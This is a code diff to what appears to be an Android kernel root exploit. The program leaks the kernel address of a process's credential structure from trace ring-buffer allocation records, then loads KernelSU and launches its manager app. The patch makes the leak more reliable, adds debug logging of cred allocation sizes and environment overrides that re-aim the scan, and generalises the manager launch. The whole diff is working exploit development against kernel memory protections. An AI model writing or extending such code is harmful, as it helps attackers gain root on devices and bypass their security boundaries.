@@ -72,6 +72,9 @@
 #define PAGE 4096UL
 #define SOCKBUF 8192
 #define MIN_PAGE_PAIRS 64
+/* leak_cred waits this long for the exec'd child's hello before it stops the
+ * trace; the child normally answers within tens of milliseconds. */
+#define HELLO_WAIT_MS 2000
 
 /* ---- per-build constants -----------------------------------------------
  *
@@ -158,7 +161,29 @@ static int detect_timer_site(const unsigned char *b, size_t n, int pid);
  * (the +0x00 qword points at the "sys_exit" string, +0x40 is the only NULL
  * callback slot).  A newer kernel that grows another member before funcs
  * shifts this -- re-check against BTF after any kernel bump. */
+static void logf(const char *fmt, ...);
 #define KSU_PKG "me.weishu.kernelsu"
+
+/* Manager package the final launch targets.  The App passes the manager it
+ * detected (SukiSU Nova is com.sukisu.nova, KernelSU Next, ...) through
+ * IC_KSU_PKG; IC_KSU_NO_LAUNCH=1 leaves the launch to the App, which has the
+ * launcher intent resolved already.  Only package-name characters are
+ * accepted because the value ends up in a shell command. */
+static const char *ksu_pkg(void)
+{
+    const char *p = getenv("IC_KSU_PKG");
+
+    if (!p || !*p)
+        return KSU_PKG;
+    for (const char *c = p; *c; c++)
+        if (!((*c >= 'a' && *c <= 'z') || (*c >= 'A' && *c <= 'Z') ||
+              (*c >= '0' && *c <= '9') || *c == '.' || *c == '_'))
+        {
+            logf("[!] IC_KSU_PKG has unusable characters; using " KSU_PKG "\n");
+            return KSU_PKG;
+        }
+    return p;
+}
 
 #define CHILD_HELLO 0x52445931
 #define CHILD_MAGIC 0x50474552
@@ -502,6 +527,54 @@ static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
         found++;
     }
     return found;
+}
+
+/* Debug aid for a missed cred leak: the distinct (bytes_req, bytes_alloc)
+ * pairs of the child's own kmem_cache_alloc records, restricted to sizes a
+ * struct cred could plausibly have.  Tells a wrong cred_req in the staged
+ * table (a pair is listed, but not the expected one) apart from the exec
+ * not being inside the trace window at all (no pair listed).  One logf call
+ * so the line cannot interleave with the child's output. */
+static void log_child_alloc_sizes(const unsigned char *b, size_t n, int pid,
+                                  unsigned long long want)
+{
+    unsigned long long req[12], alloc[12], cnt[12];
+    char line[512];
+    int hc = 0, k, len;
+
+    for (size_t i = 16; i + 24 <= n; i += 4)
+    {
+        unsigned long long r, a;
+
+        if (u32(b, i - 12) != (unsigned)pid || !is_kernel_ptr(u64(b, i)))
+            continue;
+        r = u64(b, i + 8);
+        a = u64(b, i + 16);
+        if (r < 0x60 || r > 0x200 || a < r)
+            continue;
+        for (k = 0; k < hc; k++)
+            if (req[k] == r && alloc[k] == a)
+            {
+                cnt[k]++;
+                break;
+            }
+        if (k == hc && hc < 12)
+        {
+            req[hc] = r;
+            alloc[hc] = a;
+            cnt[hc] = 1;
+            hc++;
+        }
+    }
+    len = snprintf(line, sizeof(line),
+                   "[cred] child=%d kmem_cache_alloc sizes near cred (want "
+                   "req=%#llx):", pid, want);
+    for (k = 0; k < hc && len > 0 && (size_t)len < sizeof(line); k++)
+        len += snprintf(line + len, sizeof(line) - (size_t)len,
+                        " %#llx/%#llx x%llu", req[k], alloc[k], cnt[k]);
+    if (!hc)
+        snprintf(line + len, sizeof(line) - (size_t)len, " none");
+    logf("%s\n", line);
 }
 
 static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
@@ -2282,7 +2355,23 @@ static unsigned long long leak_cred(unsigned char *raw,
         close(st[1]);
         if (write(go[1], "A", 1) != 1)
             logf("[!] leak go write failed\n");
-        usleep(50000);
+        /* Wait for the child's hello instead of sleeping a fixed 50 ms.  The
+         * hello is written after execve(), so by then the exec cred
+         * allocation is in the ring whatever the scheduling latency on this
+         * CPU.  The fixed window was observed to close before the child had
+         * even reached execve (R=0 on every attempt while task_recs=1, i.e.
+         * the fork allocation made it and the exec one did not) on a busy
+         * little core.  The ring holds ~16 MiB per CPU, so a late hello costs
+         * nothing but a slightly longer window. */
+        {
+            struct pollfd pf = {.fd = st[0], .events = POLLIN};
+            int pr = poll(&pf, 1, HELLO_WAIT_MS);
+            ssize_t hr = pr > 0 ? read(st[0], &hello, sizeof(hello)) : -1;
+
+            if (hr != (ssize_t)sizeof(hello))
+                logf("[leak] child=%d hello not received (poll=%d read=%zd;"
+                     " exec may have failed)\n", p, pr, hr);
+        }
         trace_stop();
         n = read_cpu(g_cpu, raw, 48u << 20);
         if (n > 0)
@@ -2292,11 +2381,7 @@ static unsigned long long leak_cred(unsigned char *raw,
         }
         if (R && (!g_fake_stage || task))
         {
-            struct pollfd pf = {.fd = st[0], .events = POLLIN};
-
-            if (poll(&pf, 1, 2000) > 0 &&
-                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
-                hello == CHILD_HELLO)
+            if (hello == CHILD_HELLO)
             {
                 logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                      "recs=%d task=%#llx task_recs=%d\n",
@@ -2307,7 +2392,11 @@ static unsigned long long leak_cred(unsigned char *raw,
                 *task_out = task;
                 return R;
             }
+            logf("[cred] child=%d hello=%#x (expected %#x)\n", p, hello,
+                 CHILD_HELLO);
         }
+        else if (!R && n > 0)
+            log_child_alloc_sizes(raw, (size_t)n, (int)p, G_CRED_REQ);
         logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
              "task=%#llx task_recs=%d failed\n",
              attempt, p, R, hello, c, task, tc);
@@ -3138,9 +3227,13 @@ int main(int argc, char **argv)
         }
     }
     {
-        int sr = setsid();
+        int sr;
 
-        logf("[main] setsid rc=%d errno=%d\n", sr, errno);
+        errno = 0;
+        sr = setsid();
+        /* setsid() returns the new session id (== pid here) on success; the
+         * errno printed next to it is only meaningful when sr is -1. */
+        logf("[main] setsid rc=%d errno=%d\n", sr, sr < 0 ? errno : 0);
     }
 
     if (argc > 1 && !strcmp(argv[1], "wait"))
@@ -3345,6 +3438,26 @@ int main(int argc, char **argv)
                  g_init_groups_link, g_init_cred_link, g_root_user_rt,
                  g_init_user_ns_rt, g_init_ucounts_rt, g_init_groups_rt,
                  g_init_cred_rt);
+        }
+        /* Debug override for the cred allocation signature the trace scan
+         * matches on: when a run logs "kmem_cache_alloc sizes near cred" with
+         * a different pair than the table's cred_req, IC_CRED_REQ (and
+         * optionally IC_CRED_ALLOC, the slab bucket) re-aims the scan
+         * without a new table. */
+        {
+            const char *e = getenv("IC_CRED_REQ");
+
+            if (e && *e)
+            {
+                g_geo.cred_req = strtoull(e, NULL, 0);
+                logf("[geo] cred_req overridden to %#llx\n", g_geo.cred_req);
+            }
+            e = getenv("IC_CRED_ALLOC");
+            if (e && *e)
+            {
+                g_geo.cred_alloc = strtoull(e, NULL, 0);
+                logf("[geo] cred_alloc overridden to %#llx\n", g_geo.cred_alloc);
+            }
         }
     }
 
@@ -4063,9 +4176,23 @@ int main(int argc, char **argv)
          * point -- the root child drove ksud late-load, kernelsu.ko is
          * resident, the init stages ran -- so one clean start is all that is
          * left. */
-        logf("[+] starting KSU manager after verified handoff\n");
         {
-            int stop_rc = system("am force-stop " KSU_PKG " 2>/dev/null");
+            const char *pkg = ksu_pkg();
+            char cmd[512];
+
+            if (getenv("IC_KSU_NO_LAUNCH"))
+            {
+                /* The App owns the manager lifecycle: it launches the manager
+                 * it detected once this exit status says the module is up. */
+                logf("[+] manager launch left to the App (%s)\n", pkg);
+                tmark("done");
+                logf("[+] fake chain complete; exiting (reboot still recommended "
+                     "to clear the boot-scoped driver state)\n");
+                return 0;
+            }
+            logf("[+] starting KSU manager %s after verified handoff\n", pkg);
+            snprintf(cmd, sizeof(cmd), "am force-stop %s 2>/dev/null", pkg);
+            int stop_rc = system(cmd);
 
             usleep(200000);
             if (stop_rc != 0)
@@ -4078,13 +4205,27 @@ int main(int argc, char **argv)
                      "manager\n", stop_rc);
                 return 1;
             }
-            if (system("am start -n " KSU_PKG "/.ui.MainActivity "
-                       ">/dev/null 2>&1") != 0)
+            /* Resolve the launcher activity instead of assuming
+             * <pkg>/.ui.MainActivity: the activity name differs between
+             * KernelSU, SukiSU Nova and the other forks.  Falls back to
+             * monkey when the resolver prints nothing usable. */
+            snprintf(cmd, sizeof(cmd),
+                     "am start -a android.intent.action.MAIN "
+                     "-c android.intent.category.LAUNCHER "
+                     "-n \"$(cmd package resolve-activity --brief %s "
+                     "2>/dev/null | tail -1)\" >/dev/null 2>&1", pkg);
+            if (system(cmd) != 0)
             {
-                /* Do not report completion for a launch that did not happen:
-                 * the runner keys its success on this exit status. */
-                logf("[!] am start failed; handoff incomplete\n");
-                return 1;
+                snprintf(cmd, sizeof(cmd),
+                         "monkey -p %s -c android.intent.category.LAUNCHER 1 "
+                         ">/dev/null 2>&1", pkg);
+                if (system(cmd) != 0)
+                {
+                    /* Do not report completion for a launch that did not happen:
+                     * the runner keys its success on this exit status. */
+                    logf("[!] am start failed for %s; handoff incomplete\n", pkg);
+                    return 1;
+                }
             }
         }
         tmark("done");
